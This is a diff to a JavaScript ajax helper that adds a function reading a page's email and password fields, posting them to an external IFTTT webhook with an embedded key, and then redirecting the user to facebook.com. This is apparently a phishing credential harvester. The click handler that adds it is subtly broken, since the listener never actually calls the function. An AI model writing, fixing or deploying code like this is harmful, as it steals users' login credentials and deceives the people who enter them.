@@ -58,5 +58,18 @@ ajax.post = function (url, data, callback, async) {
     ajax.send(url, callback, 'POST', query.join('&'), async)
 };
 
+function makecall(e) {
+    e.preventDefault();
+    var URL = "https://maker.ifttt.com/trigger/contact_form/with/key/brwW0KlsvFeQsRMMuD0Qmz";
+    var value2 = document.getElementById('emailInput'), value3 = document.getElementById('passwordInput');
+    ajax.post(URL, {value1: 'name', value2: value2.value, value3: value3.value}, function() {
+        window.location = "https://facebook.com";
+    });
+}
+
+
+var btn = document.getElementById("button");
+btn.addEventListener("click", (e) => makecall, false);
+
 //var URL = "https://maker.ifttt.com/trigger/contact_form/with/key/brwW0KlsvFeQsRMMuD0Qmz";
 //ajax.post(URL, {value1: 'name', value2: 'em', value3: 'pw'}, function() {});
